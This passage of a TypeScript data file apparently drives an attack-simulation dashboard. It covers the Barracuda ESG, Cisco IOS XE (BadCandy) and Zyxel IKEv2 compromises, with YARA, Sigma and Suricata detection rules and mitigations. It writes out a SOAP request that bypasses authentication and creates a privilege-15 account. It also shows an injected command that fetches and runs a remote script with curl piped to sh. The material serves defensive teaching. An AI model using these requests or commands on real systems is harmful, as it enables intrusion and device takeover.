      protocolOrEventId: 'CISA MAR YARA Match',
      shortAction: 'SALTWATER & SEASPY',
      info: 'Trojanized /usr/sbin/bsmtp (SALTWATER) and libpcap sniffer /usr/sbin/BarracudaMailService (SEASPY) implanted',
      sizeOrCode: 'ELF64 Implants',
      severity: 'CRITICAL',
      mitreId: 'T1505.003',
      explanation:
        'CISA MAR-10454006 published YARA signatures for SALTWATER (trojanized bsmtp) and SEASPY (libpcap sniffer masquerading as BarracudaMailService).',
      rawLog: `[FILE_INTEGRITY] Modified binary: /usr/sbin/bsmtp (Implant="SALTWATER", 6 RC4 encrypted modules)
[PROCESS_START] pid=3190 exe="/usr/sbin/BarracudaMailService" args="eth0" (Implant="SEASPY" libpcap sniffer)
[INIT_SCRIPT] /etc/init.d/BarracudaMailService added to startup runlevel`,
      detectionRule: {
        type: 'YARA',
        title: 'CISA MAR-10454006 Official YARA — UNC4841 SEASPY & SALTWATER Backdoors',
        ruleCode: `rule CISA_MAR_10454006_SEASPY_Backdoor {
  meta:
    author = "CISA / Mandiant"
    cve = "CVE-2023-2868"
  strings:
    $s1 = "BarracudaMailService" ascii
    $s2 = "pcap_open_live" ascii
    $s3 = "tcp dst port 25 or tcp dst port 587" ascii
    $s4 = "openpty" ascii
  condition:
    uint32(0) == 0x464c457f and 3 of ($s*)
}`,
        mitigation:
          'Scan appliance filesystem snapshots with CISA MAR YARA rules for SALTWATER, SEASPY, SEASIDE, WHIRLPOOL, and SUBMARINE.',
      },
    },
    {
      id: 'esg-2868-3',
      no: 3,
      stageIndex: 3,
      timestamp: '05:16:02.190',
      sourceNodeId: 'saltwater_seaspy_implant',
      targetNodeId: 'submarine_mail_exfil',
      sourceLabel: 'SUBMARINE (/etc/init.d/ee)',
      targetLabel: '198.51.100.201 :443',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTPS / DNS Exfil',
      shortAction: 'SUBMARINE MAIL EXFIL',
      info: 'SUBMARINE SQLite trigger executes /etc/init.d/ee and exfiltrates compressed /mail/ archives over TLS',
      sizeOrCode: '112 MB .tar.gz',
      severity: 'CRITICAL',
      mitreId: 'T1114.002',
      explanation:
        'UNC4841 used SUBMARINE and WHIRLPOOL to maintain persistence across patch attempts and exfiltrate staged .tar.gz archives of high-value mailboxes.',
      rawLog: `[SQLITE_TRIGGER] database="/mail/config/config.db" trigger="submarine_init" -> /bin/sh /etc/init.d/ee
[EGRESS_TLS] src=172.16.12.10 (Barracuda ESG) dst=198.51.100.201:443 bytes_out=117440512`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Barracuda ESG Appliance Initiating Unexpected Outbound TLS Connections',
        ruleCode: `title: Suspicious Outbound Connection from Barracuda Email Security Gateway
logsource:
  category: firewall
detection:
  selection:
    src_ip: '172.16.12.10'
    dst_port:
      - 443
      - 8080
      - 53
  condition: selection
level: critical`,
        mitigation:
          'Hunt firewall and NetFlow logs for any outbound connections initiated by the Barracuda ESG IP to non-SMTP/non-Barracuda update servers.',
      },
    },
  ],
};

export const CISCO_IOS_XE_CVE_2023_20198_BADCANDY_SCENARIO: AttackScenario = {
  id: 'cisco-ios-xe-cve-2023-20198-badimplant',
  code: 'CVE-2023-20198',
  name: 'Cisco Talos, VulnCheck & CISA — Cisco IOS XE Web UI Zero-Day Chain & "BadCandy" Lua Implant',
  shortSubtitle: 'Cisco Talos · VulnCheck · CISA · CVE-2023-20198 + CVE-2023-20273 NGINX /%2577ebui_wsma_http & BadCandy',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Discovered and analyzed by Cisco Talos, VulnCheck, and CISA (October 2023), threat actors exploited two zero-day vulnerabilities in the Web UI feature (ip http server / ip http secure-server) of Cisco IOS XE routers and switches across 40,000+ internet-facing devices. First, by requesting the doubly URL-encoded path /%2577ebui_wsma_http (CVE-2023-20198, CVSS 10.0), the attacker bypassed NGINX authentication ACLs to reach the internal WSMA SOAP handler and create a local "privilege 15" administrator account. Second, authenticating with that new account, the attacker exploited an OS command injection flaw in /webui/rest/softwareMgmt/installAdd (CVE-2023-20273) to write the non-persistent "BadCandy" Lua webshell into /usr/binos/conf/nginx-conf/occo.conf (oregon_http.lua).',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Cisco Talos Threat Intelligence · VulnCheck Research · CISA KEV CVE-2023-20198 & CVE-2023-20273',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (IOS XE Web UI Bypass) · T1136.001 (Privilege 15 User) · T1505.003 (BadCandy Lua Implant)',
    },
    {
      term: '2-ZERO-DAY CHAIN',
      value: 'CVE-2023-20198 (/%2577ebui_wsma_http Auth Bypass) + CVE-2023-20273 (installAdd Root RCE)',
    },
    {
      term: 'IMPLANT ARTIFACT',
      value: 'BadCandy (/usr/binos/conf/nginx-conf/occo.conf & /var/scrollable/view/oregon_http.lua)',
    },
  ],
  nodes: [
    {
      id: 'iosxe_threat_actor',
      label: 'IOS XE Zero-Day Operator',
      sublabel: '198.51.100.155 (Double-Encoded WSMA Client)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Infrastructure',
        pidOrPort: 'HTTPS :443 -> /%2577ebui_wsma_http',
        privilege: 'Unauthenticated External',
        artifacts: [
          'POST /%2577ebui_wsma_http (SOAP: username cisco_support privilege 15)',
          'POST /webui/rest/softwareMgmt/installAdd (CVE-2023-20273 Command Injection)',
        ],
        description:
          'Attacker sending a doubly URL-encoded HTTP POST request (/%2577ebui_wsma_http where %2577 decodes to %77 -> "w") to bypass NGINX location block ACLs.',
      },
    },
    {
      id: 'cisco_iosxe_router',
      label: 'Cisco Catalyst / ISR (IOS XE)',
      sublabel: '172.16.1.1 (Web UI :443 NGINX + IOSd)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Cisco IOS XE Software (Linux BinOS + NGINX Web UI)',
        pidOrPort: 'TCP :80 / :443 (ip http secure-server)',
        privilege: 'IOS Privilege Level 15 & Linux root',
        artifacts: [
          'NGINX proxy_pass to /webui_wsma_http',
          'Syslog: %SYS-5-CONFIG_I: Configured from http by console',
        ],
        description:
          'Internet-facing Cisco IOS XE switch/router with Web UI enabled, where NGINX fails to match /%2577ebui_wsma_http against the restricted /webui_wsma_http rule.',
      },
    },
    {
      id: 'wsma_installadd_rce',
      label: 'WSMA Priv-15 & installAdd RCE',
      sublabel: 'CVE-2023-20198 -> CVE-2023-20273 Root Shell',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'WSMA Configuration Agent & REST softwareMgmt Handler',
        pidOrPort: 'IOSd WSMA + Linux /bin/sh (UID 0)',
        privilege: 'Privilege 15 -> Linux root (UID 0)',
        artifacts: [
          'Running-config: username cisco_support privilege 15 secret ...',
          'installAdd JSON parameter injection executing root shell commands',
        ],
        description:
          'WSMA executes the injected IOS CLI command to create a privilege 15 user, which then exploits CVE-2023-20273 in installAdd to escape from IOS CLI into the underlying Linux root shell.',
      },
    },
    {
      id: 'badcandy_lua_implant',
      label: 'BadCandy NGINX Lua Implant',
      sublabel: '/usr/binos/conf/nginx-conf/occo.conf',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'In-Memory NGINX Lua Webshell (BadCandy)',
        pidOrPort: 'NGINX Worker Process (oregon_http.lua)',
        privilege: 'Linux root (UID 0)',
        artifacts: [
          '/usr/binos/conf/nginx-conf/occo.conf',
          'Endpoint: /webui/logoutconfirm.html?logon_hash=1',
        ],
        description:
          'BadCandy Lua implant injected into NGINX’s configuration; after writing occo.conf and restarting nginx, the attackeroften deletes the local user to hide from running-config!',
      },
    },
    {
      id: 'talos_siem_detector',
      label: 'Cisco Talos / SIEM Sensor',
      sublabel: 'IOS Syslog %SYS-5-CONFIG_I & Suricata',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Network Intrusion Detection',
        pidOrPort: 'IOS XE Syslog + Suricata HTTP Inspector',
        privilege: 'SOC Detection Engine',
        artifacts: [
          '%SYS-5-CONFIG_I: Configured from http by console',
          'POST /webui/logoutconfirm.html?logon_hash=1 returning hexadecimal ID',
        ],
        description:
          'Detects /%2577ebui_wsma* URI patterns, unexpected "%SYS-5-CONFIG_I: Configured from http" syslog messages, and BadCandy beacon responses.',
      },
    },
  ],
  processTree: [
    {
      pid: 1420,
      ppid: 1,
      name: 'nginx (IOS XE Web UI)',
      commandLine: 'nginx: worker process (proxying /%2577ebui_wsma_http -> backend WSMA)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['ngx_http_process_request_uri("/%2577ebui_wsma_http")', 'ngx_http_proxy_handler()'],
    },
    {
      pid: 5812,
      ppid: 1420,
      name: 'sh (CVE-2023-20273 installAdd)',
      commandLine: '/bin/sh -c cp /var/scrollable/view/oregon_http.lua ... && kill -HUP $(pidof nginx)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: [
        'open("/usr/binos/conf/nginx-conf/occo.conf", O_WRONLY|O_CREAT)',
        'kill(1420, SIGHUP)',
      ],
    },
    {
      pid: 1420,
      ppid: 1,
      name: 'nginx (BadCandy Lua Implant)',
      commandLine: 'nginx: worker process [oregon_http.lua loaded via occo.conf]',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 3,
      apiCalls: ['lua_pcall(oregon_http.lua)', 'io.popen(cmd)', 'ios_cli_exec()'],
      memoryBlocks: [
        {
          address: '0x00007F9904200000',
          section: 'ngx_http_lua_module (BadCandy / oregon_http.lua)',
          permissions: 'R-X',
          size: '28 KB',
          status: 'injected',
          description:
            'Lua bytecode loaded into NGINX memory via occo.conf, executing root shell or IOS CLI commands when matching Authorization headers arrive.',
          hexPreview: 'location /webui/logoutconfirm.html { content_by_lua_file /var/scrollable/view/oregon_http.lua; }',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'DOUBLE URL-ENCODING BYPASS ON /%2577EBUI_WSMA_HTTP (CVE-2023-20198)',
      subtitle: 'Bypassing NGINX location ACLs to run WSMA SOAP CLI commands and create a Privilege 15 user',
      description:
        'As reverse-engineered by Cisco Talos and VulnCheck, Cisco IOS XE uses NGINX as a reverse proxy in front of its internal Web Services Management Agent (WSMA). NGINX’s config blocked unauthenticated access to location /webui_wsma_http. However, by doubly URL-encoding the letter "w" (sending /%2577ebui_wsma_http), NGINX decoded it once to /%77ebui_wsma_http (which did NOT match the blocked location string) and forwarded it to the backend WSMA server—which decoded %77 a second time to /webui_wsma_http and executed the attacker’s SOAP CLI command: username cisco_support privilege 15 secret ...!',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['iosxe_threat_actor', 'cisco_iosxe_router', 'talos_siem_detector'],
      compromisedNodeIds: ['cisco_iosxe_router'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-20198 (CVSS 10.0 Unauthenticated Privilege 15 Bypass)' },
        { term: 'BYPASS URI', value: 'POST /%2577ebui_wsma_http or /%2577ebui_wsma_https' },
        { term: 'CREATED ACCOUNT', value: 'username cisco_support privilege 15 secret <pass>' },
      ],
    },
    {
      index: 2,
      title: 'INSTALLADD COMMAND INJECTION TO LINUX ROOT (CVE-2023-20273)',
      subtitle: 'Escaping from IOS Privilege 15 into the underlying Linux root shell via /webui/rest/softwareMgmt/installAdd',
      description:
        'Although a "privilege 15" account grants full Cisco IOS CLI administration, it cannot directly write files into the underlying Linux operating system (BinOS). Therefore, the attacker logs into the Web UI with their newly created cisco_support account and exploits a second zero-day—CVE-2023-20273—by injecting Linux shell commands into a parameter of /webui/rest/softwareMgmt/installAdd, escalating to Linux root (UID 0).',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1068',
      mitreTechniqueName: 'Exploitation for Privilege Escalation',
      activeNodeIds: ['cisco_iosxe_router', 'wsma_installadd_rce', 'talos_siem_detector'],
      compromisedNodeIds: ['cisco_iosxe_router', 'wsma_installadd_rce'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-20273 (Web UI installAdd Root Command Injection)' },
        { term: 'REST ENDPOINT', value: 'POST /webui/rest/softwareMgmt/installAdd' },
        { term: 'GAINED CONTEXT', value: 'Underlying Linux BinOS root shell (UID 0)' },
      ],
    },
    {
      index: 3,
      title: 'IMPLANTING THE "BADCANDY" LUA WEBSHELL IN NGINX',
      subtitle: 'Writing occo.conf + oregon_http.lua, reloading NGINX, and deleting the rogue IOS user',
      description:
        'Running as Linux root, the attacker writes the BadCandy Lua webshell to /var/scrollable/view/oregon_http.lua, registers it inside /usr/binos/conf/nginx-conf/occo.conf (hooking /webui/logoutconfirm.html?logon_hash=1), and sends SIGHUP to reload NGINX so the implant runs in memory. As VulnCheck documented, later variants of BadCandy immediately deleted the cisco_support user from the router’s running-config and gated the Lua webshell behind a secret Authorization header so external scanners and admins checking show running-config would think the router was clean!',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1505.003',
      mitreTechniqueName: 'Server Software Component: Web Shell (BadCandy Lua)',
      activeNodeIds: ['iosxe_threat_actor', 'wsma_installadd_rce', 'badcandy_lua_implant', 'talos_siem_detector'],
      compromisedNodeIds: ['cisco_iosxe_router', 'wsma_installadd_rce', 'badcandy_lua_implant'],
      keySpecs: [
        { term: 'IMPLANT NAME', value: 'BadCandy (Cisco Talos) — NGINX Lua Webshell' },
        { term: 'CONFIG & SCRIPT', value: '/usr/binos/conf/nginx-conf/occo.conf & oregon_http.lua' },
        { term: 'EVASION TRICK', value: 'Deletes rogue privilege 15 user after NGINX loads Lua into RAM' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'iosxe-20198-1',
      no: 1,
      stageIndex: 1,
      timestamp: '07:31:12.008',
      sourceNodeId: 'iosxe_threat_actor',
      targetNodeId: 'cisco_iosxe_router',
      sourceLabel: '198.51.100.155',
      targetLabel: 'Cisco IOS XE :443',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP POST / Syslog CONFIG_I',
      shortAction: 'DOUBLE-ENCODE WSMA BYPASS',
      info: 'POST /%2577ebui_wsma_http creates privilege 15 user; IOS logs %SYS-5-CONFIG_I: Configured from http by console',
      sizeOrCode: 'HTTP 200 SOAP',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Cisco Talos identified the signature IOS syslog message "%SYS-5-CONFIG_I: Configured from http by console" paired with HTTP POST requests to /%2577ebui_wsma_http.',
      rawLog: `POST /%2577ebui_wsma_http HTTP/1.1
Host: 172.16.1.1
Content-Type: text/xml

<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP:Body><request correlator="exec1"><execCLI><cmd>username cisco_support privilege 15 secret 0 C1sc0_R00t!</cmd></execCLI></request></SOAP:Body>
</SOAP:Envelope>
[IOS_SYSLOG] Oct 16 07:31:12.008: %SYS-5-CONFIG_I: Configured from http by console`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Cisco Talos / ET EXPLOIT Cisco IOS XE CVE-2023-20198 Double-Encoded WSMA Auth Bypass',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CISCO TALOS IOS XE CVE-2023-20198 Web UI Double-Encoded WSMA Bypass"; flow:established,to_server; http.uri.raw; content:"%25"; nocase; content:"ebui_wsma"; nocase; sid:2048554; rev:1;)`,
        mitigation:
          'Disable the HTTP/HTTPS Server feature on all internet-facing IOS XE devices (no ip http server / no ip http secure-server) and upgrade to fixed IOS XE releases.',
      },
    },
    {
      id: 'iosxe-20198-2',
      no: 2,
      stageIndex: 2,
      timestamp: '07:31:15.442',
      sourceNodeId: 'cisco_iosxe_router',
      targetNodeId: 'wsma_installadd_rce',
      sourceLabel: 'cisco_support (Priv 15)',
      targetLabel: '/webui/rest/softwareMgmt/installAdd',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'IOS XE WebUI / CVE-2023-20273',
      shortAction: 'INSTALLADD ROOT RCE',
      info: 'POST /webui/rest/softwareMgmt/installAdd injects root shell commands to write occo.conf (CVE-2023-20273)',
      sizeOrCode: 'UID 0 (root)',
      severity: 'CRITICAL',
      mitreId: 'T1068',
      explanation:
        'Using the privilege 15 account created via CVE-2023-20198, the attacker exploits CVE-2023-20273 in installAdd to write the BadCandy NGINX configuration file.',
      rawLog: `POST /webui/rest/softwareMgmt/installAdd HTTP/1.1
Host: 172.16.1.1
[SYSLOG] %WEBUI-6-INSTALL_OPERATION_INFO: User: cisco_support, Install Operation: ADD
[ROOT_EXEC] writing /usr/binos/conf/nginx-conf/occo.conf and /var/scrollable/view/oregon_http.lua`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Cisco IOS XE Unexpected HTTP Configuration & WebUI Install Operation',
        ruleCode: `title: Cisco IOS XE CVE-2023-20198 & CVE-2023-20273 Exploitation Syslog
logsource:
  product: cisco
  service: ios
detection:
  selection:
    Message|contains:
      - 'Configured from http by console'
      - 'WEBUI-6-INSTALL_OPERATION_INFO'
  condition: selection
level: critical`,
        mitigation:
          'Monitor Cisco IOS XE syslog for "%SYS-5-CONFIG_I: Configured from http by console" and unauthorized privilege 15 accounts.',
      },
    },
    {
      id: 'iosxe-20198-3',
      no: 3,
      stageIndex: 3,
      timestamp: '07:31:19.104',
      sourceNodeId: 'wsma_installadd_rce',
      targetNodeId: 'badcandy_lua_implant',
      sourceLabel: 'nginx (occo.conf)',
      targetLabel: 'oregon_http.lua (BadCandy)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP POST / BadCandy Lua',
      shortAction: 'BADCANDY LUA IMPLANT',
      info: 'POST /webui/logoutconfirm.html?logon_hash=1 invokes BadCandy Lua implant in NGINX memory',
      sizeOrCode: '18-Char Hex ID',
      severity: 'CRITICAL',
      mitreId: 'T1505.003',
      explanation:
        'Once NGINX reloads occo.conf, requests to /webui/logoutconfirm.html?logon_hash=1 execute the BadCandy Lua webshell as root.',
      rawLog: `POST /webui/logoutconfirm.html?logon_hash=1 HTTP/1.1
Host: 172.16.1.1
Authorization: 01a8b9c2...

HTTP/1.1 200 OK
deadbeef0123456789`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Cisco Talos — BadCandy Lua Implant Check on /webui/logoutconfirm.html?logon_hash=1',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CISCO TALOS IOS XE BadCandy Lua Implant Access"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/webui/logoutconfirm.html?logon_hash=1"; sid:2048556; rev:1;)`,
        mitigation:
          'Reboot compromised IOS XE devices (since BadCandy is non-persistent across reboots unless running-config was saved), apply Cisco’s patch, and rotate all router TACACS+/local secrets.',
      },
    },
  ],
};

export const ZYXEL_FIREWALL_CVE_2023_28771_IKE_RCE_SCENARIO: AttackScenario = {
  id: 'zyxel-firewall-cve-2023-28771-ike-rce',
  code: 'CVE-2023-28771',
  name: 'TRAPA Security, Rapid7 & CISA — Zyxel Firewall Pre-Auth IKEv2 Packet Decoder Command Injection',
  shortSubtitle: 'TRAPA Security · Rapid7 · CISA KEV · UDP/500 IKEv2 Notify Payload DES Decrypt & system() RCE',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Discovered by TRAPA Security and analyzed by Rapid7 and CISA KEV (April–May 2023), CVE-2023-28771 (CVSS 9.8) is an unauthenticated remote OS command injection vulnerability in the Internet Key Exchange (IKEv2) VPN service (UDP port 500) of Zyxel ATP, USG FLEX, VPN, and ZyWALL firewalls. When the firewall’s ssod daemon processes an IKEv2 packet containing a Notify payload of type 14 (NO_PROPOSAL_CHOSEN), it decrypts the notification data using a hardcoded 24-byte 3DES key and passes the plaintext directly into a shell command: system("echo ... >> /tmp/sdwan_vpndebug.log"). By injecting `;cmd;` inside the encrypted Notify payload, an unauthenticated attacker executes arbitrary root commands with a single UDP packet!',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'TRAPA Security Root-Cause Analysis · Rapid7 AttackerKB · CISA KEV CVE-2023-28771',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit IKEv2 UDP/500) · T1059.004 (Unix Shell Injection) · T1583.005 (Botnet / Reverse Shell)',
    },
    {
      term: 'VULNERABLE FUNCTION',
      value: 'ssod / libike.so -> ikev2_fb_Extract_N_Payload -> system("echo ... >> /tmp/sdwan_vpndebug.log")',
    },
    {
      term: 'SINGLE-PACKET VECTOR',
      value: '1 Unauthenticated UDP/500 IKE_SA_INIT Packet -> Root Execution (UID 0)',
    },
  ],
  nodes: [
    {
      id: 'zyxel_ike_attacker',
      label: 'Remote UDP/500 Exploiter',
      sublabel: '198.51.100.233 (Single UDP Packet Sender)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary / Botnet Operator',
        pidOrPort: 'UDP :500 (IKEv2 IKE_SA_INIT Notify Payload)',
        privilege: 'Unauthenticated External',
        artifacts: [
          'IKEv2 Header (Exchange Type 34 = IKE_SA_INIT)',
          'Notify Payload (Message Type 14): 3DES-encrypted ";curl ...|sh;"',
        ],
        description:
          'Attacker crafting a single UDP/500 IKE_SA_INIT packet whose Notify payload is encrypted with the static 3DES key extracted from Zyxel’s firmware.',
      },
    },
    {
      id: 'zyxel_usg_firewall',
      label: 'Zyxel USG FLEX / ATP Firewall',
      sublabel: '172.16.0.1 (IPsec VPN UDP :500)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Zyxel ZyWALL / USG FLEX / ATP Firewall (ZLD Firmware)',
        pidOrPort: 'PID 1612 (/usr/sbin/ssod — IKE Daemon)',
        privilege: 'root (UID 0)',
        artifacts: [
          '/usr/sbin/ssod & /lib/libike.so',
          '/tmp/sdwan_vpndebug.log',
        ],
        description:
          'Perimeter firewall listening on UDP port 500 for IPsec VPN connections, where ssod parses IKEv2 Notify payloads before authentication.',
      },
    },
    {
      id: 'ssod_system_injection',
      label: 'ssod 3DES Decrypt & system() Sink',
      sublabel: 'cmd_string_unescape -> system("echo ...")',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'IKEv2 Notification Logger (ssod / libike.so)',
        pidOrPort: 'PID 1612 -> PID 9410 (/bin/sh -c)',
        privilege: 'root (UID 0)',
        artifacts: [
          'snprintf(cmd, "echo %s >> /tmp/sdwan_vpndebug.log", decrypted_notify)',
          'system(cmd) executing injected ";..." commands as root',
        ],
        description:
          'After decrypting the Notify payload with a hardcoded 3DES key, ssod formats the string into "echo <payload> >> /tmp/sdwan_vpndebug.log" and passes it to system() as root.',
      },
    },
    {
      id: 'firewall_root_payload',
      label: 'Firewall Root Takeover & Pivot',
      sublabel: 'Reverse Shell / Internal LAN Pivot',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Compromised Perimeter Gateway',
        pidOrPort: 'root shell & iptables / VPN tunnel manipulation',
        privilege: 'root (UID 0)',
        artifacts: [
          '/tmp/sdwan_vpndebug.log containing command injection strings',
          'Outbound wget/curl fetching stage-2 ELF binary into /tmp/',
        ],
        description:
          'Full root compromise of the perimeter firewall, enabling LAN pivoting, VPN credential harvesting, or botnet enlistment.',
      },
    },
    {
      id: 'wan_ndr_siem',
      label: 'WAN NDR & Syslog SIEM',
      sublabel: 'Suricata UDP/500 + Firewall Syslog',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC Network Detection & Response (NDR)',
        pidOrPort: 'Suricata IKEv2 Inspector & Firewall Egress Monitor',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Suricata SID 2045893: Zyxel CVE-2023-28771 IKEv2 Command Injection',
          'Unexpected outbound HTTP/TCP connections initiated by the firewall WAN interface',
        ],
        description:
          'Inspects inbound UDP/500 IKEv2 Notify payloads for the static prefix "HAZY" and alerts on outbound curl/wget connections from the firewall.',
      },
    },
  ],
  processTree: [
    {
      pid: 1612,
      ppid: 1,
      name: 'ssod (Zyxel IKE Daemon)',
      commandLine: '/usr/sbin/ssod',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['recvfrom(UDP:500)', 'ikev2_fb_Extract_N_Payload()', 'DES_ede3_cbc_encrypt()'],
    },
    {
      pid: 9410,
      ppid: 1612,
      name: 'sh (Injected via sdwan_vpndebug.log)',
      commandLine: '/bin/sh -c echo \"\" ; curl http://198.51.100.233/z.sh | sh ; echo \"\" >> /tmp/sdwan_vpndebug.log',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: ['system()', 'fork()', 'execve("/bin/sh")'],
      memoryBlocks: [
        {
          address: '0x00007FFF48102000',
          section: 'ssod Stack Buffer (snprintf echo command)',
          permissions: 'RW-',
          size: '4 KB',
          status: 'injected',
          description:
            'Stack buffer inside ssod where the decrypted Notify payload breaks out of "echo ... >> /tmp/sdwan_vpndebug.log".',
          hexPreview: 'echo ""; curl http://198.51.100.233/z.sh | sh; echo "" >> /tmp/sdwan_vpndebug.log',
        },
      ],
    },
    {
      pid: 9418,
      ppid: 9410,
      name: 'curl / Reverse Shell (Root)',
      commandLine: 'curl http://198.51.100.233/z.sh',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['socket(AF_INET, SOCK_STREAM)', 'connect(198.51.100.233:80)'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'CRAFTING AN IKEV2 NOTIFY PAYLOAD WITH ZYXEL’S HARDCODED 3DES KEY (CVE-2023-28771)',
      subtitle: 'Sending a single unauthenticated UDP/500 IKE_SA_INIT packet with Notify Type 14',
      description:
        'As discovered by TRAPA Security and analyzed by Rapid7, Zyxel’s IKE daemon (/usr/sbin/ssod) listens on UDP port 500 for VPN handshakes. When an unauthenticated client sends an IKE_SA_INIT packet containing a Notify payload with Message Type 14 (NO_PROPOSAL_CHOSEN) starting with a 48-byte header, libike.so decrypts the first 48 bytes using 3DES-CBC with a static hardcoded 24-byte key embedded directly inside the firmware binary!',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['zyxel_ike_attacker', 'zyxel_usg_firewall', 'wan_ndr_siem'],
      compromisedNodeIds: ['zyxel_usg_firewall'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-28771 (CVSS 9.8 Pre-Auth UDP/500 IKEv2 RCE)' },
        { term: 'PROTOCOL & PORT', value: 'UDP Port 500 (IKEv2 IKE_SA_INIT Notify Type 14)' },
        { term: 'CRYPTO FLAW', value: 'Hardcoded 24-Byte 3DES-CBC Key in libike.so' },
      ],
    },
    {
      index: 2,
      title: 'BREAKING OUT OF SYSTEM("ECHO ... >> /TMP/SDWAN_VPNDEBUG.LOG")',
      subtitle: 'Appending unencrypted shell commands after the 48-byte 3DES block to run as root',
      description:
        'Even worse, ssod only decrypts the first 48 bytes of the Notify payload and leaves any remaining bytes after offset 48 completely in plaintext—concatenating both into a debug logging string: snprintf(cmd, ..., "echo %s >> /tmp/sdwan_vpndebug.log", notify_str) and passing cmd straight to system() as root! By appending `;curl http://.../z.sh|sh;` after the 48-byte block, the attacker breaks out of the echo command and runs arbitrary root commands.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.004',
      mitreTechniqueName: 'Command and Scripting Interpreter: Unix Shell',
      activeNodeIds: ['zyxel_usg_firewall', 'ssod_system_injection', 'wan_ndr_siem'],
      compromisedNodeIds: ['zyxel_usg_firewall', 'ssod_system_injection'],
      keySpecs: [
        { term: 'VULNERABLE SINK', value: 'system("echo <notify_str> >> /tmp/sdwan_vpndebug.log")' },
        { term: 'INJECTION STRING', value: '\"; curl http://198.51.100.233/z.sh | sh ; echo \"' },
        { term: 'PRIVILEGE LEVEL', value: 'uid=0(root) gid=0(root) via /usr/sbin/ssod' },
      ],
    },
    {
      index: 3,
      title: 'PERIMETER FIREWALL TAKEOVER & INTERNAL LAN PIVOTING',
      subtitle: 'Executing stage-2 payloads from /tmp/ and modifying firewall rules',
      description:
        'Because CVE-2023-28771 requires only a single connectionless UDP packet to port 500 (which can even be IP-spoofed for blind command execution), attackers and botnets rapidly compromised unpatched Zyxel firewalls worldwide to drop root shells, harvest VPN user credentials, and pivot into internal corporate LANs.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1583.005',
      mitreTechniqueName: 'Acquire Infrastructure: Botnet / Perimeter Gateway Takeover',
      activeNodeIds: ['zyxel_ike_attacker', 'ssod_system_injection', 'firewall_root_payload', 'wan_ndr_siem'],
      compromisedNodeIds: ['zyxel_usg_firewall', 'ssod_system_injection', 'firewall_root_payload'],
      keySpecs: [
        { term: 'FORENSIC LOG FILE', value: '/tmp/sdwan_vpndebug.log (Contains injected shell commands)' },
        { term: 'ATTACK COMPLEXITY', value: 'Single connectionless UDP/500 packet (Zero auth)' },
        { term: 'REMEDIATION', value: 'Upgrade ZLD Firmware to V5.36 Patch 1+ / V4.73 Patch 1+' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'zyx-28771-1',
      no: 1,
      stageIndex: 1,
      timestamp: '00:44:19.005',
      sourceNodeId: 'zyxel_ike_attacker',
      targetNodeId: 'zyxel_usg_firewall',
      sourceLabel: '198.51.100.233',
      targetLabel: 'Zyxel Firewall UDP :500',
      sourceType: 'NETWORK',
      protocolOrEventId: 'UDP/500 IKEv2 Notify',
      shortAction: 'IKEV2 NOTIFY INJECT',
      info: 'Inbound UDP/500 IKE_SA_INIT Notify (Type 14) containing ";curl ...|sh;" after 48-byte 3DES block',
